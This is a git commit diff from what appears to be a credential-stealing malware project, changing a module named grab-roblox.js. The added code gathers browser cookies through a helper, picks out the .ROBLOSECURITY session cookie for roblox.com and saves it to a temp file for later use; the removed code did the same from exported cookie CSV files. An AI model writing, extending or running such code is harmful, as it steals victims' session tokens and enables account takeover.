dcb37f07d157a4be95d2707be35c489de8a4fcaa
Yuuto <55290516+JustYuuto@users.noreply.github.com>
2023-06-26 06:10:29 +0200

    get roblox cookie

--- functions/grab-roblox.js
+++ functions/grab-roblox.js
@@ -4,17 +4,12 @@ const { tempFolder } = require('../index');
 const { searchForFile } = require('../util/dir');
 const axios = require('axios');
 const { writeFileSync } = require('fs');
+const { getCookies } = require('../util/cookies');
 
 module.exports = async () => {
-  for (const browser of fs.readdirSync(join(tempFolder, 'Browsers')).filter(f => f.split('.').length >= 1)) {
-    const file = join(tempFolder, 'Browsers', browser, 'Cookies.csv');
-    let line = await searchForFile(file, 500);
-    if (!line) return;
-    line = fs.readFileSync(file).toString().split('\n').find(l => l.includes('.roblox.com') && l.includes('.ROBLOSECURITY'));
-    if (!line) return;
-    const cookie = line.split(',')[2];
-    fs.writeFileSync(join(tempFolder, 'Roblox Cookie.txt'), cookie);
-  }
+  const cookies = await getCookies();
+  const cookie = cookies.find(cookie => cookie.includes('.roblox.com') && cookie.includes('.ROBLOSECURITY')).value;
+  fs.writeFileSync(join(tempFolder, 'Roblox Cookie.txt'), cookie);
 
   const file = await searchForFile(join(tempFolder, 'Roblox Cookie.txt'), 1000, 10);
   if (!file || file.trim() === '') return;
